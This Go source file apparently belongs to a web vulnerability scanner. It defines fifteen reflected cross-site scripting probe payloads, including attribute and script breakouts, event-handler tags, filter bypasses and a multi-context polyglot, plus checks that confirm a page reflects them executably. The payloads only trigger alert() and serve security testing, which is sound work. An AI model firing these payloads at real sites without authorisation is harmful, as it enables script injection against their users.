package xss

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"regexp"
	"strings"
)

// newCanary mints this run's unique marker token -- embedded in every
// payload this scanner sends so a reflection can be attributed back to the
// exact request that produced it (rather than, say, a coincidental
// "alert(1)" already present in a demo page's own markup), and so two
// payloads that differ only in canary never collide. crypto/rand.Read only
// errors on a broken system entropy source, which would already be fatal
// well before this ever ran -- same fallback reasoning as
// pwreset.unknownIdentifier.
func newCanary() string {
	var b [6]byte
	if _, err := rand.Read(b[:]); err != nil {
		copy(b[:], []byte("apxss"))
	}
	return "apxss" + hex.EncodeToString(b[:])
}

// payloadDef is one XSS probe shape -- build embeds the run's canary token
// into a realistic PoC payload (an operator can copy it straight into a
// browser to confirm), match judges whether a response reflects it in a way
// that would actually execute. Shaped like openredirect.payloadModuleDef,
// but match replaces that package's shared detect(): each technique's "did
// this land" check differs enough (a couple need a context-specific regex
// rather than a plain substring test) that a single shared detector would
// end up special-casing half the payloads anyway.
type payloadDef struct {
	id, name, severity string
	build              func(canary string) string
	// match reports whether body shows payload landed somewhere it would
	// actually be parsed/executed, returning the evidence snippet to
	// surface in the Finding.
	match func(body, payload, canary string) (evidence string, ok bool)
}

// substringMatch is the default match: the exact payload, byte-for-byte,
// present somewhere in the response body. Good enough for every technique
// whose payload is only dangerous as a literal substring regardless of
// surrounding markup (a <script> tag, an event-handler attribute) -- it's
// the javascript: URI payload alone that needs to additionally confirm
// *where* it landed (see javascriptURIMatch).
func substringMatch(body, payload, _ string) (string, bool) {
	if strings.Contains(body, payload) {
		return payload, true
	}
	return "", false
}

// hrefAttrPattern matches an href/src/action/formaction attribute value
// starting with "javascript:" -- used by javascriptURIMatch to confirm the
// payload reflected into a context a browser actually navigates/executes,
// as opposed to inert text that happens to contain the same string.
var hrefAttrPattern = regexp.MustCompile(`(?is)(?:href|src|action|formaction)\s*=\s*["']?\s*javascript:`)

func javascriptURIMatch(body, payload, canary string) (string, bool) {
	if !strings.Contains(body, payload) {
		return "", false
	}
	idx := strings.Index(body, payload)
	start := max(idx-80, 0)
	window := body[start:idx] + payload
	if hrefAttrPattern.MatchString(window) {
		return payload, true
	}
	return "", false
}

// payloadModules is the battery of XSS techniques fired against every
// candidate parameter (see xss.go's Run). Each covers a distinct way an
// application's input handling commonly fails:
//
//   - script-tag / attribute-breakout-*/ script-context-breakout /
//     html-comment-breakout: the classic "reflected into HTML with no
//     encoding at all" shapes, differing only in what has to be broken out
//     of first (a quoted attribute, an already-open <script> block, an HTML
//     comment).
//   - img-onerror / svg-onload / details-ontoggle: tag-based payloads that
//     don't need the literal string "script" at all -- catches a filter
//     that blocks <script> specifically but not other event-handler-bearing
//     elements.
//   - event-handler-attribute-breakout: stays on the *same* tag (adds an
//     attribute rather than a new element) -- catches a filter that blocks
//     "<"/">" but not quotes.
//   - js-string-breakout-*: for a reflection point already inside an inline
//     <script>'s own quoted string literal (e.g. `var q = "USERINPUT";`).
//   - case-obfuscated-script: mixed-case tag name -- defeats a
//     case-sensitive string/regex filter checking for literal "<script>".
//   - svg-foreignobject-bypass: nests a real <script> inside
//     <svg><foreignObject>, which slips past a filter that strips top-level
//     <script> tags but doesn't parse nested SVG content.
//   - polyglot: a single payload shaped to execute across several different
//     injection contexts (HTML tag, HTML attribute, JS string, URI) at
//     once -- the well-known Gareth Heyes/PortSwigger polyglot, condensed.
//   - javascript-uri: for a parameter that feeds an href/src/action rather
//     than rendering into the page body directly (a "profile link", a
//     redirect field used as a literal attribute value).
var payloadModules = []payloadDef{
	{
		id: "script-tag", name: "Raw <script> tag injection", severity: "critical",
		build: func(c string) string { return fmt.Sprintf("<script>/*%s*/alert(document.domain)</script>", c) },
		match: substringMatch,
	},
	{
		id: "attribute-breakout-dquote", name: "Double-quoted attribute breakout", severity: "critical",
		build: func(c string) string { return fmt.Sprintf(`"><script>/*%s*/alert(document.domain)</script>`, c) },
		match: substringMatch,
	},
	{
		id: "attribute-breakout-squote", name: "Single-quoted attribute breakout", severity: "critical",
		build: func(c string) string { return fmt.Sprintf(`'><script>/*%s*/alert(document.domain)</script>`, c) },
		match: substringMatch,
	},
	{
		id: "script-context-breakout", name: "Existing <script> block breakout", severity: "critical",
		build: func(c string) string {
			return fmt.Sprintf("</script><script>/*%s*/alert(document.domain)</script>", c)
		},
		match: substringMatch,
	},
	{
		id: "html-comment-breakout", name: "HTML comment breakout", severity: "high",
		build: func(c string) string { return fmt.Sprintf("--><script>/*%s*/alert(document.domain)</script>", c) },
		match: substringMatch,
	},
	{
		id: "img-onerror", name: "<img onerror> event-handler injection", severity: "high",
		build: func(c string) string { return fmt.Sprintf(`<img src=x data-%s=1 onerror=alert(document.domain)>`, c) },
		match: substringMatch,
	},
	{
		id: "svg-onload", name: "<svg onload> event-handler injection", severity: "high",
		build: func(c string) string { return fmt.Sprintf(`<svg data-%s=1 onload=alert(document.domain)>`, c) },
		match: substringMatch,
	},
	{
		id: "details-ontoggle", name: "<details ontoggle> event-handler injection", severity: "high",
		build: func(c string) string {
			return fmt.Sprintf(`<details data-%s=1 open ontoggle=alert(document.domain)>`, c)
		},
		match: substringMatch,
	},
	{
		id: "event-handler-attribute-breakout", name: "Same-tag event-handler attribute breakout", severity: "high",
		build: func(c string) string { return fmt.Sprintf(`" autofocus onfocus=alert(/*%s*/document.domain) x="`, c) },
		match: substringMatch,
	},
	{
		id: "js-string-breakout-dquote", name: "Double-quoted JS string literal breakout", severity: "high",
		build: func(c string) string { return fmt.Sprintf(`";alert(/*%s*/document.domain);"`, c) },
		match: substringMatch,
	},
	{
		id: "js-string-breakout-squote", name: "Single-quoted JS string literal breakout", severity: "high",
		build: func(c string) string { return fmt.Sprintf(`';alert(/*%s*/document.domain);'`, c) },
		match: substringMatch,
	},
	{
		id: "case-obfuscated-script", name: "Mixed-case tag filter bypass", severity: "high",
		build: func(c string) string { return fmt.Sprintf("<ScRiPt>/*%s*/alert(document.domain)</sCriPt>", c) },
		match: substringMatch,
	},
	{
		id: "svg-foreignobject-bypass", name: "SVG foreignObject nested-script bypass", severity: "high",
		build: func(c string) string {
			return fmt.Sprintf(
				`<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>/*%s*/alert(document.domain)</script></body></foreignObject></svg>`,
				c,
			)
		},
		match: substringMatch,
	},
	{
		id: "polyglot", name: "Multi-context polyglot injection", severity: "critical",
		// Condensed version of the well-known Gareth Heyes/PortSwigger XSS
		// polyglot -- shaped to break out of a JS string, an HTML attribute,
		// and plain HTML body text with the same single payload, then fire
		// via either an onclick handler (if it lands mid-attribute) or a
		// trailing <svg onload> (if it lands in the HTML body).
		build: func(c string) string {
			return fmt.Sprintf(
				"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('%s') )//%%0D%%0A%%0d%%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('%s')//>\\x3e",
				c, c,
			)
		},
		match: substringMatch,
	},
	{
		id: "javascript-uri", name: "javascript: URI injection into href/src", severity: "medium",
		build: func(c string) string { return fmt.Sprintf("javascript:/*%s*/alert(document.domain)", c) },
		match: javascriptURIMatch,
	},
}
